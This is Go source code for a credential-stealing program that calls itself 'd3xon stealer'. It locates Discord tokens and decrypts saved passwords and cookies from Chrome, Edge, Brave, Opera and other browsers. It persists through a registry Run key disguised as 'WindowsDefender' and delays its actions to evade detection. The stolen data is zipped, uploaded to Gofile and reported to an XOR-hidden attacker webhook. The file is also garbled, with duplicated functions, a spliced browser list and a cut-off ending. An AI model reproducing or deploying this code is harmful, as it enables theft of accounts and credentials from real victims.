package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var errorLog []string

func logError(format string, args ...interface{}) {
	// Disabled for stealth
}

func logSuccess(format string, args ...interface{}) {
	// Disabled for stealth
}

func saveErrorLog(tempDir string) {
	// Disabled for stealth
}

const (
	// XOR-encrypted webpanel URL for DC tokens: http://23.132.228.234:5000/api/dc-webhook
	encWebhook = "322E2E2A6075756869746B6968746868627468696E606F6A6A6A753B2A33753E39772D3F3832353531"
	// XOR-encrypted webhook URL for ZIP notifications: http://23.132.228.234:5000/api/webhook
	encZipWebhook = "322E2E2A6075756869746B6968746868627468696E606F6A6A6A753B2A33752D3F3832353531"
	// Gofile API
	gofileUploadURL = "https://store1.gofile.io/uploadFile"
	xorKey          = 0x5A
	mutexName       = "Global\\D3x0nStealerMutex"
)

// XOR decrypt string helper
func xorDecrypt(hex string) string {
	encrypted := []byte{}
	for i := 0; i < len(hex); i += 2 {
		b := byte(0)
		fmt.Sscanf(hex[i:i+2], "%02x", &b)
		encrypted = append(encrypted, b^xorKey)
	}
	return string(encrypted)
}

// Obfuscated path builders
func getDiscordPath(variant string) string {
	// discord, discordcanary, discordptb
	base := xorDecrypt("68696E696F727968") // "discord" XOR 0x5A
	roaming := os.Getenv("APPDATA")
	return filepath.Join(roaming, base+variant)
}

func getBrowserPath(browser, path string) string {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	
	switch browser {
	case "chrome":
		// Google\Chrome\User Data\Default
		return filepath.Join(local, "Google", "Chrome", "User Data", path)
	case "edge":
		return filepath.Join(local, "Microsoft", "Edge", "User Data", path)
	case "brave":
		return filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data", path)
	case "opera":
		return filepath.Join(roaming, "Opera Software", "Opera Stable")
	case "operagx":
		return filepath.Join(roaming, "Opera Software", "Opera GX Stable")
	case "vivaldi":
		return filepath.Join(local, "Vivaldi", "User Data", path)
	case "yandex":
		return filepath.Join(local, "Yandex", "YandexBrowser", "User Data", path)
	default:
		return ""
	}
}

var (
	tokenRegex     = regexp.MustCompile(`[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}`)
	encTokenRegex  = regexp.MustCompile(`dQw4w9WgXcQ:[A-Za-z0-9+/=]+`)
	crypt32        = syscall.NewLazyDLL("Crypt32.dll")
	kernel32       = syscall.NewLazyDLL("kernel32.dll")
	cryptUnprotect = crypt32.NewProc("CryptUnprotectData")
	createMutex    = kernel32.NewProc("CreateMutexW")
)

// Random delay to avoid detection
func randomDelay() {
	ms := 50 + rand.Intn(200) // 50-250ms
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// Check if already running (Anti-Detection)
func checkMutex() bool {

type DataBlob struct {
	cbData uint32
	pbData *byte
}

type WebpanelPayload struct {
	Platform     string `json:"platform"`
	Token        string `json:"token"`
	Username     string `json:"username"`
	ComputerName string `json:"computername"`
}

type GofileResponse struct {
	Status string `json:"status"`
	Data   struct {
		DownloadPage string `json:"downloadPage"`
		Code         string `json:"code"`
		ParentFolder string `json:"parentFolder"`
		FileId       string `json:"fileId"`
	} `json:"data"`
}

type ZipNotificationEmbed struct {
	Embeds []struct {
		Title       string `json:"title"`
		Description string `json:"description"`
		Color       int    `json:"color"`
		Fields      []struct {
			Name   string `json:"name"`
			Value  string `json:"value"`
			Inline bool   `json:"inline"`
		} `json:"fields"`
		Footer struct {
			Text string `json:"text"`
		} `json:"footer"`
		Timestamp string `json:"timestamp"`
	} `json:"embeds"`
	Username  string `json:"username"`
	AvatarURL string `json:"avatar_url"`
}

type Password struct {
	URL      string
	Username string
	Password string
}

type Cookie struct {
	Host  string
	Name  string
	Value string
}

func decryptWebhook() string {
	return xorDecrypt(encWebhook)
}

func decryptUploadURL() string {
	return xorDecrypt(encZipWebhook)
}

// Random delay to avoid detection
func randomDelay() {
	ms := 50 + rand.Intn(200) // 50-250ms
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// Check if already running (Anti-Detection)
func checkMutex() bool {
	mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
	ret, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
	if ret == 0 {
		return false
	}
	lastErr := syscall.GetLastError()
	return lastErr != syscall.ERROR_ALREADY_EXISTS
}

// Add to startup registry (Persistenz) - delayed and stealthy
func addToStartup() {
	// Random delay before registry modification
	time.Sleep(time.Duration(2+rand.Intn(3)) * time.Second)
	
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Use golang.org/x/sys/windows for proper Windows API
	k, err := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	if err != nil {
		return
	}

	var key syscall.Handle
	err = syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, k, 0, syscall.KEY_WRITE, &key)
	if err != nil {
		return
	}
	defer syscall.RegCloseKey(key)

	name, _ := syscall.UTF16PtrFromString("WindowsDefender")
	
	valueBytes := syscall.StringToUTF16(exePath)

	// Manual RegSetValueEx call
	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
	regSetValueEx := modadvapi32.NewProc("RegSetValueExW")
	
	regSetValueEx.Call(
		uintptr(key),
		uintptr(unsafe.Pointer(name)),
		0,
		syscall.REG_SZ,
		uintptr(unsafe.Pointer(&valueBytes[0])),
		uintptr(len(valueBytes)*2),
	)
	
	randomDelay() // Small delay after registry operation
}

func dpApiDecrypt(data []byte) ([]byte, error) {
	var outBlob DataBlob
	inBlob := DataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, err := cryptUnprotect.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, err
	}

	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outBlob.pbData)))
	result := make([]byte, outBlob.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])
	return result, nil
}

func getEncryptionKey(path string) []byte {
	localStatePath := filepath.Join(path, "Local State")
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}

	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encKey, _ := base64.StdEncoding.DecodeString(encKeyB64)
	encKey = encKey[5:] // Remove "DPAPI" prefix

	key, err := dpApiDecrypt(encKey)
	if err != nil {
		return nil
	}
	return key
}

func decryptToken(encToken string, key []byte) string {
	if !strings.HasPrefix(encToken, "dQw4w9WgXcQ:") {
		return ""
	}

	encData, _ := base64.StdEncoding.DecodeString(strings.TrimPrefix(encToken, "dQw4w9WgXcQ:"))
	if len(encData) < 15 {
		return ""
	}

	iv := encData[3:15]
	ciphertext := encData[15:]
	if len(ciphertext) < 16 {
		return ""
	}

	tag := ciphertext[len(ciphertext)-16:]
	ciphertext = ciphertext[:len(ciphertext)-16]

	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return ""
	}

	return strings.TrimSpace(string(plaintext))
}

func decryptChromiumPassword(encPassword []byte, key []byte) string {
	if len(encPassword) == 0 {
		return ""
	}

	// Check if it's DPAPI encrypted (old method)
	if len(encPassword) > 0 && encPassword[0] != 'v' {
		decrypted, err := dpApiDecrypt(encPassword)
		if err == nil {
			return string(decrypted)
		}
		return ""
	}

	// AES-GCM decryption (v10 prefix)
	if len(encPassword) < 15 || string(encPassword[:3]) != "v10" {
		return ""
	}

	iv := encPassword[3:15]
	ciphertext := encPassword[15:]
	if len(ciphertext) < 16 {
		return ""
	}

	tag := ciphertext[len(ciphertext)-16:]
	ciphertext = ciphertext[:len(ciphertext)-16]

	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}

	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return ""
	}

	return string(plaintext)
}

func decryptChromiumCookie(encValue []byte, key []byte) string {
	if len(encValue) == 0 {
		return ""
	}

	// Check for v10 prefix
	if len(encValue) < 3 || string(encValue[:3]) != "v10" {
		// Try DPAPI
		decrypted, err := dpApiDecrypt(encValue)
		if err == nil {
			return string(decrypted)
		}
		return ""
	}

	if len(encValue) < 15 {
		return ""
	}

	iv := encValue[3:15]
	ciphertext := encValue[15:]
	if len(ciphertext) < 16 {
		return ""
	}

	tag := ciphertext[len(ciphertext)-16:]
	ciphertext = ciphertext[:len(ciphertext)-16]

	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}

	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return ""
	}

	return string(plaintext)
}

func scanFile(path string, key []byte) []string {
	var tokens []string
	data, _ := ioutil.ReadFile(path)
	content := string(data)

	// Encrypted tokens
	if key != nil {
		for _, match := range encTokenRegex.FindAllString(content, -1) {
			decrypted := decryptToken(match, key)
			if decrypted != "" && tokenRegex.MatchString(decrypted) {
				tokens = append(tokens, decrypted)
			}
		}
	}

	// Plain tokens
	for _, match := range tokenRegex.FindAllString(content, -1) {
		parts := strings.Split(match, ".")
		if len(parts) == 3 && len(parts[1]) == 6 {
			tokens = append(tokens, match)
		}
	}

	return tokens
}

func scanPath(path, platform string) []string {
	var tokens []string
	var key []byte

	if strings.Contains(platform, "Chrome") || strings.Contains(platform, "Edge") || strings.Contains(platform, "Brave") || strings.Contains(platform, "Opera") {
		key = getEncryptionKey(filepath.Dir(path))
	} else if strings.Contains(platform, "Discord") {
		key = getEncryptionKey(path)
	}

	leveldbPath := filepath.Join(path, "Local Storage", "leveldb")
	files, _ := ioutil.ReadDir(leveldbPath)

	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
			tokens = append(tokens, scanFile(filepath.Join(leveldbPath, file.Name()), key)...)
		}
	}

	return tokens
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func saveToFile(path, content string) error {
	return ioutil.WriteFile(path, []byte(content), 0644)
}

func savePasswordsToFile(passwords []Password, tempDir string) {
	if len(passwords) == 0 {
		logError("No passwords found")
		return
	}
	
	var content strings.Builder
	content.WriteString("╔══════════════════════════════════════════════════════╗\n")
	content.WriteString("║            STOLEN BROWSER PASSWORDS                  ║\n")
	content.WriteString("╚══════════════════════════════════════════════════════╝\n\n")
	content.WriteString(fmt.Sprintf("Total Passwords: %d\n", len(passwords)))
	content.WriteString(fmt.Sprintf("Collected: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	content.WriteString("─────────────────────────────────────────────────────\n\n")
	
	for i, pwd := range passwords {
		content.WriteString(fmt.Sprintf("[%d]\n", i+1))
		content.WriteString(fmt.Sprintf("🌐 URL: %s\n", pwd.URL))
		content.WriteString(fmt.Sprintf("👤 Username: %s\n", pwd.Username))
		content.WriteString(fmt.Sprintf("🔑 Password: %s\n", pwd.Password))
		content.WriteString("\n─────────────────────────────────────────────────────\n\n")
	}
	
	path := filepath.Join(tempDir, "passwords.txt")
	err := saveToFile(path, content.String())
	if err != nil {
		logError("Failed to save passwords: %v", err)
	} else {
		logSuccess("Saved %d passwords to passwords.txt", len(passwords))
	}
}

func saveCookiesToFile(cookies []Cookie, tempDir string) {
	if len(cookies) == 0 {
		logError("No cookies found")
		return
	}
	
	var content strings.Builder
	content.WriteString("╔══════════════════════════════════════════════════════╗\n")
	content.WriteString("║            STOLEN BROWSER COOKIES                    ║\n")
	content.WriteString("╚══════════════════════════════════════════════════════╝\n\n")
	content.WriteString(fmt.Sprintf("Total Cookies: %d\n", len(cookies)))
	content.WriteString(fmt.Sprintf("Collected: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	content.WriteString("─────────────────────────────────────────────────────\n\n")
	
	for i, cookie := range cookies {
		content.WriteString(fmt.Sprintf("[%d]\n", i+1))
		content.WriteString(fmt.Sprintf("🌐 Host: %s\n", cookie.Host))
		content.WriteString(fmt.Sprintf("📝 Name: %s\n", cookie.Name))
		content.WriteString(fmt.Sprintf("📋 Value: %s\n", cookie.Value))
		content.WriteString("\n─────────────────────────────────────────────────────\n\n")
	}
	
	path := filepath.Join(tempDir, "cookies.txt")
	err := saveToFile(path, content.String())
	if err != nil {
		logError("Failed to save cookies: %v", err)
	} else {
		logSuccess("Saved %d cookies to cookies.txt", len(cookies))
	}
}

func saveSystemInfo(tempDir string) {
	var content strings.Builder
	content.WriteString("╔══════════════════════════════════════════════════════╗\n")
	content.WriteString("║              SYSTEM INFORMATION                      ║\n")
	content.WriteString("╚══════════════════════════════════════════════════════╝\n\n")
	
	content.WriteString(fmt.Sprintf("💻 Computer Name: %s\n", os.Getenv("COMPUTERNAME")))
	content.WriteString(fmt.Sprintf("👤 Username: %s\n", os.Getenv("USERNAME")))
	content.WriteString(fmt.Sprintf("🏠 User Profile: %s\n", os.Getenv("USERPROFILE")))
	content.WriteString(fmt.Sprintf("⏰ Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	
	// Get public IP
	resp, err := http.Get("https://api.ipify.org")
	if err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		content.WriteString(fmt.Sprintf("🌐 Public IP: %s\n", string(body)))
	}
	
	path := filepath.Join(tempDir, "system_info.txt")
	saveToFile(path, content.String())
	logSuccess("System info saved")
}

func parseSQLiteLoginData(data []byte, key []byte) []Password {
	var passwords []Password
	
	// SQLite database header check
	if len(data) < 100 || string(data[0:13]) != "SQLite format" {
		return passwords
	}
	
	// Look for the logins table structure
	// SQLite stores strings as length-prefixed values
	content := string(data)
	
	// Find origin_url pattern (URLs in SQLite)
	urlPattern := regexp.MustCompile(`https?://[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=%]+`)
	urls := urlPattern.FindAllString(content, -1)
	
	// Find v10/v11 encrypted passwords
	passwordPattern := regexp.MustCompile(`v1[01][\x00-\xff]{31,}`)
	encryptedPasswords := passwordPattern.FindAll(data, -1)
	
	// Find username values (email-like or alphanumeric strings before passwords)
	usernamePattern := regexp.MustCompile(`[\w\-\.]+@[\w\-\.]+|[\w\-\.]{3,50}`)
	usernames := usernamePattern.FindAllString(content, -1)
	
	// Match URLs with passwords
	for i, encPass := range encryptedPasswords {
		// Skip if too short or too long
		if len(encPass) < 31 || len(encPass) > 500 {
			continue
		}
		
		decrypted := decryptChromiumPassword(encPass, key)
		if decrypted != "" && len(decrypted) >= 3 && len(decrypted) < 100 {
			url := "unknown"
			username := "unknown"
			
			// Try to find matching URL (search backwards from password position)
			if i < len(urls) {
				url = urls[i]
			}
			
			// Try to find matching username
			if i < len(usernames) {
				username = usernames[i]
			}
			
			passwords = append(passwords, Password{
				URL:      url,
				Username: username,
				Password: decrypted,
			})
		}
	}
	
	return passwords
}

func stealPasswords(browserPath, browserName string, key []byte, tempDir string) []Password {
	var passwords []Password

	// Try all profiles
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"}
	basePath := filepath.Dir(browserPath)
	
	for _, profile := range profiles {
		profilePath := filepath.Join(basePath, profile)
		loginDataPath := filepath.Join(profilePath, "Login Data")
		
		if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
			continue
		}

		// Copy to temp to avoid lock
		tempDB := filepath.Join(tempDir, fmt.Sprintf("%s_%s_LoginData.db", browserName, profile))
		if err := copyFile(loginDataPath, tempDB); err != nil {
			logError("%s %s: Failed to copy Login Data: %v", browserName, profile, err)
			continue
		}

		// Read SQLite file
		data, err := ioutil.ReadFile(tempDB)
		os.Remove(tempDB) // Clean up immediately
		
		if err != nil {
			logError("%s %s: Failed to read Login Data: %v", browserName, profile, err)
			continue
		}

		// Parse SQLite and extract passwords
		profilePasswords := parseSQLiteLoginData(data, key)
		if len(profilePasswords) > 0 {
			logSuccess("%s %s: Found %d passwords", browserName, profile, len(profilePasswords))
			passwords = append(passwords, profilePasswords...)
		}
	}

	return passwords
}

func parseSQLiteCookies(data []byte, key []byte) []Cookie {
	var cookies []Cookie
	
	// SQLite database header check
	if len(data) < 100 || string(data[0:13]) != "SQLite format" {
		return cookies
	}
	
	content := string(data)
	
	// Find host_key (domain) pattern
	hostPattern := regexp.MustCompile(`\.?[a-zA-Z0-9\-]+\.[a-zA-Z]{2,}`)
	hosts := hostPattern.FindAllString(content, -1)
	
	// Find cookie names (alphanumeric with underscores/dashes)
	namePattern := regexp.MustCompile(`[a-zA-Z_][a-zA-Z0-9_\-]{2,30}`)
	names := namePattern.FindAllString(content, -1)
	
	// Find encrypted cookie values (v10/v11)
	valuePattern := regexp.MustCompile(`v1[01][\x00-\xff]{31,200}`)
	encryptedValues := valuePattern.FindAll(data, -1)
	
	// Decrypt and match cookies
	for i, encValue := range encryptedValues {
		if len(encValue) < 31 || len(encValue) > 500 {
			continue
		}
		
		decrypted := decryptChromiumPassword(encValue, key)
		if decrypted != "" && len(decrypted) >= 3 {
			host := "unknown"
			name := "unknown"
			
			if i < len(hosts) {
				host = hosts[i]
			}
			if i < len(names) {
				name = names[i]
			}
			
			cookies = append(cookies, Cookie{
				Host:  host,
				Name:  name,
				Value: decrypted,
			})
		}
	}
	
	return cookies
}

func stealCookies(browserPath, browserName string, key []byte, tempDir string) []Cookie {
	var cookies []Cookie

	// Try all profiles
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"}
	basePath := filepath.Dir(browserPath)
	
	for _, profile := range profiles {
		profilePath := filepath.Join(basePath, profile)
		
		// Try both cookie paths
		cookiesPaths := []string{
			filepath.Join(profilePath, "Network", "Cookies"),
			filepath.Join(profilePath, "Cookies"),
		}
		
		for _, cookiesPath := range cookiesPaths {
			if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
				continue
			}

			// Copy to temp
			tempDB := filepath.Join(tempDir, fmt.Sprintf("%s_%s_Cookies.db", browserName, profile))
			if err := copyFile(cookiesPath, tempDB); err != nil {
				continue
			}

			// Read SQLite file
			data, err := ioutil.ReadFile(tempDB)
			os.Remove(tempDB) // Clean up immediately
			
			if err != nil {
				continue
			}

			// Parse SQLite and extract cookies
			profileCookies := parseSQLiteCookies(data, key)
			if len(profileCookies) > 0 {
				logSuccess("%s %s: Found %d cookies", browserName, profile, len(profileCookies))
				cookies = append(cookies, profileCookies...)
			}
			
			break // Found cookies in this profile
		}
	}

	return cookies
}

func createZipArchive(tempDir string) (string, error) {
	// Create ZIP in system temp directory to avoid permission issues
	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("data_%d.zip", time.Now().Unix()))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	fileCount := 0
	
	// Add all files from temp directory
	files, err := ioutil.ReadDir(tempDir)
	if err != nil {
		return "", err
	}
	
	for _, file := range files {
		if file.IsDir() || strings.HasSuffix(file.Name(), ".zip") || strings.HasSuffix(file.Name(), ".db") {
			continue
		}

		filePath := filepath.Join(tempDir, file.Name())
		fileToZip, err := os.Open(filePath)
		if err != nil {
			continue
		}

		info, err := fileToZip.Stat()
		if err != nil {
			fileToZip.Close()
			continue
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			fileToZip.Close()
			continue
		}

		header.Method = zip.Deflate
		header.Name = file.Name()
		
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			fileToZip.Close()
			continue
		}

		_, err = io.Copy(writer, fileToZip)
		fileToZip.Close()
		
		if err == nil {
			fileCount++
		}
	}
	
	// Close writer to finalize ZIP
	zipWriter.Close()
	zipFile.Close()
	
	// Verify ZIP was created and has content
	if fileCount == 0 {
		os.Remove(zipPath)
		return "", fmt.Errorf("no files to archive")
	}
	
	zipInfo, err := os.Stat(zipPath)
	if err != nil || zipInfo.Size() == 0 {
		os.Remove(zipPath)
		return "", fmt.Errorf("failed to create valid zip archive")
	}

	return zipPath, nil
}

func uploadZipToGofile(zipPath string) (string, error) {
	// Check if file exists and is a valid ZIP
	fileInfo, err := os.Stat(zipPath)
	if err != nil {
		return "", err
	}
	if fileInfo.Size() == 0 {
		return "", fmt.Errorf("empty zip file")
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Create form file with .zip extension
	part, err := writer.CreateFormFile("file", "data.zip")
	if err != nil {
		return "", err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return "", err
	}

	err = writer.Close()
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", gofileUploadURL, body)
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Longer timeout for large files
	client := &http.Client{
		Timeout: 180 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives:   false,
			MaxIdleConnsPerHost: 10,
		},
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("gofile upload failed with status: %d, body: %s", resp.StatusCode, string(bodyBytes))
	}

	// Parse response
	var gofileResp GofileResponse
	if err := json.NewDecoder(resp.Body).Decode(&gofileResp); err != nil {
		return "", err
	}

	if gofileResp.Status != "ok" {
		return "", fmt.Errorf("gofile upload failed: %s", gofileResp.Status)
	}

	if gofileResp.Data.DownloadPage == "" {
		return "", fmt.Errorf("no download link in response")
	}

	return gofileResp.Data.DownloadPage, nil
}

func sendZipNotificationToWebpanel(gofileURL, pcName, username, ipAddr string, fileCount int) error {
	webhookURL := decryptUploadURL()
	if webhookURL == "" {
		return fmt.Errorf("no webhook URL")
	}

	timestamp := time.Now().Format(time.RFC3339)
	
	// Build Discord-style embed
	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "📦 Data Package Received",
				"description": "New stolen data uploaded to Gofile",
				"color":       5814783, // Purple
				"timestamp":   timestamp,
				"fields": []map[string]interface{}{
					{
						"name":   "💻 PC Name",
						"value":  pcName,
						"inline": true,
					},
					{
						"name":   "👤 Username",
						"value":  username,
						"inline": true,
					},
					{
						"name":   "🌐 IP",
						"value":  ipAddr,
						"inline": true,
					},
					{
						"name":   "📁 Files",
						"value":  fmt.Sprintf("%d", fileCount),
						"inline": true,
					},
					{
						"name":   "🔗 Download",
						"value":  gofileURL,
						"inline": false,
					},
				},
				"footer": map[string]string{
					"text": "d3xon stealer • Advanced Data Exfiltration",
				},
			},
		},
		"username":   "d3xon stealer",
		"avatar_url": "https://cdn.discordapp.com/attachments/1197645837539483658/1368757060597977098/mace-cat.gif",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("webhook notification failed with status: %d", resp.StatusCode)
	}

	return nil
}

func uploadZipToWebpanel(zipPath string) error {
	// DEPRECATED: Now using Gofile instead
	return nil
}

func sendWebhook(webhook, token, platform string) {
	user := os.Getenv("USERNAME")
	pc := os.Getenv("COMPUTERNAME")

	payload := WebpanelPayload{
		Platform:     platform,
		Token:        token,
		Username:     user,
		ComputerName: pc,
	}
	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest("POST", webhook, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	client.Do(req)
	time.Sleep(500 * time.Millisecond)
}

func main() {
	// Seed random for delays
	rand.Seed(time.Now().UnixNano())
	
	// Small natural delay (3-8 seconds) - not too long, just natural behavior
	sleepTime := 3 + rand.Intn(5)
	time.Sleep(time.Duration(sleepTime) * time.Second)
	
	// Anti-Detection: Check if already running
	if !checkMutex() {
		return
	}

	randomDelay()

	// Persistenz: Add to startup (delayed in background)
	go func() {
		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
		addToStartup()
	}()
	
	randomDelay()

	webhook := decryptWebhook()
	found := make(map[string]bool)

	// Create temp directory for data collection
	tempDir, err := ioutil.TempDir("", "sysdata")
	if err != nil {
		return
	}
	defer os.RemoveAll(tempDir)
	randomDelay()

	// Discord paths - obfuscated
	discordPaths := map[string]string{
		"Discord":        getDiscordPath(""),
		"Discord Canary": getDiscordPath("canary"),
		"Discord PTB":    getDiscordPath("ptb"),
	}

	// Steal Discord tokens
	tokenCount := 0
	for platform, path := range discordPaths {
		randomDelay()
		if _, err := os.Stat(path); err == nil {
			for _, token := range scanPath(path, platform) {
				if !found[token] {
					found[token] = true
					go sendWebhook(webhook, token, platform) // Async
					tokenCount++
					randomDelay()
				}
			}
		}
	}

	// Steal browser passwords and cookies - obfuscated paths
	var allPasswords []Password
	var allCookies []Cookie

	// Main browsers only (most common)
	browsers := []string{"chrome", "edge", "brave", "opera", "operagx", "vivaldi"}
	
	for _, browser := range browsers {
		randomDelay()
		browserPath := getBrowserPath(browser, "Default")
		if browserPath == "" {
			continue
		}
		
		if _, err := os.Stat(browserPath); err == nil {
		
		// Chromium
		"Chromium": filepath.Join(local, "Chromium", "User Data", "Default"),
		
		// Chrome Canary
		"Chrome Canary": filepath.Join(local, "Google", "Chrome SxS", "User Data", "Default"),
		
		// Edge Canary
		"Edge Canary": filepath.Join(local, "Microsoft", "Edge SxS", "User Data", "Default"),
		
		// Edge Dev
		"Edge Dev": filepath.Join(local, "Microsoft", "Edge Dev", "User Data", "Default"),
		
		// Edge Beta
		"Edge Beta": filepath.Join(local, "Microsoft", "Edge Beta", "User Data", "Default"),
		
		// Chrome Beta
		"Chrome Beta": filepath.Join(local, "Google", "Chrome Beta", "User Data", "Default"),
		
		// Chrome Dev
		"Chrome Dev": filepath.Join(local, "Google", "Chrome Dev", "User Data", "Default"),
		
		// Slimjet
		"Slimjet": filepath.Join(local, "Slimjet", "User Data", "Default"),
		
		// CocCoc
		"CocCoc": filepath.Join(local, "CocCoc", "Browser", "User Data", "Default"),
		
		// Comodo Dragon
		"Comodo Dragon": filepath.Join(local, "Comodo", "Dragon", "User Data", "Default"),
		
		// Epic Privacy Browser
		"Epic": filepath.Join(local, "Epic Privacy Browser", "User Data", "Default"),
		
		// Cent Browser
		"Cent": filepath.Join(local, "CentBrowser", "User Data", "Default"),
		
		// 7Star Browser
		"7Star": filepath.Join(local, "7Star", "7Star", "User Data", "Default"),
		
		// Amigo
		"Amigo": filepath.Join(local, "Amigo", "User Data", "Default"),
		
		// Torch
		"Torch": filepath.Join(local, "Torch", "User Data", "Default"),
		
		// Iridium
		"Iridium": filepath.Join(local, "Iridium", "User Data", "Default"),
		
		// Uran
		"Uran": filepath.Join(local, "uCozMedia", "Uran", "User Data", "Default"),
		
		// Orbitum
		"Orbitum": filepath.Join(local, "Orbitum", "User Data", "Default"),
		
		// Sputnik
		"Sputnik": filepath.Join(local, "Sputnik", "Sputnik", "User Data", "Default"),
		
		// Citrio
		"Citrio": filepath.Join(local, "CatalinaGroup", "Citrio", "User Data", "Default"),
		
		// Liebao Browser
		"Liebao": filepath.Join(local, "liebao", "User Data", "Default"),
		
		// QIP Surf
		"QIP Surf": filepath.Join(local, "QIP Surf", "User Data", "Default"),
		
		// Coowon
		"Coowon": filepath.Join(local, "Coowon", "Coowon", "User Data", "Default"),
		
		// Sleipnir 6
		"Sleipnir": filepath.Join(roaming, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"),
	}

	for browserName, browserPath := range browserPaths {
		if _, err := os.Stat(browserPath); err == nil {
			key := getEncryptionKey(filepath.Dir(browserPath))
			if key != nil {
				passwords := stealPasswords(browserPath, browser, key, tempDir)
				cookies := stealCookies(browserPath, browser, key, tempDir)

				allPasswords = append(allPasswords, passwords...)
				allCookies = append(allCookies, cookies...)
				randomDelay()
			}
		}
	}

	// Save data to TXT files
	if len(allPasswords) > 0 {
		savePasswordsToFile(allPasswords, tempDir)
	}
	if len(allCookies) > 0 {
		saveCookiesToFile(allCookies, tempDir)
	}
	saveSystemInfo(tempDir)

	// Count files for stats
	files, _ := ioutil.ReadDir(tempDir)
	fileCount := 0
	for _, f := range files {
		if !f.IsDir() && !strings.HasSuffix(f.Name(), ".db") {
			fileCount++
		}
	}
	
	if fileCount == 0 {
		return // Nothing to upload
	}
	
	randomDelay()

	// Create ZIP archive
	zipPath, err := createZipArchive(tempDir)
	if err != nil {
		return
	}
	
	randomDelay()
	
	// Upload to Gofile
	gofileURL, err := uploadZipToGofile(zipPath)
	if err != nil {
		return
	}
	
	randomDelay()
	
	// Get public IP
	publicIP := "Unknown"
	resp, err := http.Get("https://api.ipify.org")
